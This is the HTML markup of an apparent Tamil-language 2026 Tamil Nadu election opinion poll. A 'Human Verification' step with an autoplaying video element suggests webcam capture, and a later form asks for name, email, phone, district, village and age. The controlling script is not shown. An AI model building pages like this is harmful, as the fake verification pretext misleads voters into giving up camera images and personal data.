<!DOCTYPE html>
<html>

<head>
  <title>தமிழ்நாடு தேர்தல் கருத்துக்கணிப்பு 2026</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>


  <!-- PAGE 2 -->
  <div id="page2" class="page active">
    <h3>பாதுகாப்பு சரிபார்ப்பு</h3>

    <div class="video-container">
      <video id="video" autoplay></video>
      <div class="overlay-text">Human Verification</div>
    </div>

    <p id="status"></p>
  </div>

  <!-- PAGE 3 -->
  <div id="page3" class="page">
    <h3>உங்கள் விவரங்கள்</h3>

    <input type="text" id="name" placeholder="பெயர் (Required)"><br>
    <input type="email" id="email" placeholder="Gmail ID (Optional)"><br>
    <input type="text" id="phone" placeholder="தொலைபேசி எண் (Optional)"><br>
    <input type="text" id="district" placeholder="மாவட்டம் (Optional)"><br>
    <input type="text" id="village" placeholder="கிராமம் (Optional)"><br>
    <input type="number" id="age" placeholder="வயது (Optional)"><br>

    <button onclick="finalSubmit()">சமர்ப்பிக்கவும்</button>
  </div>

  <script src="script.js"></script>
</body>

</html>
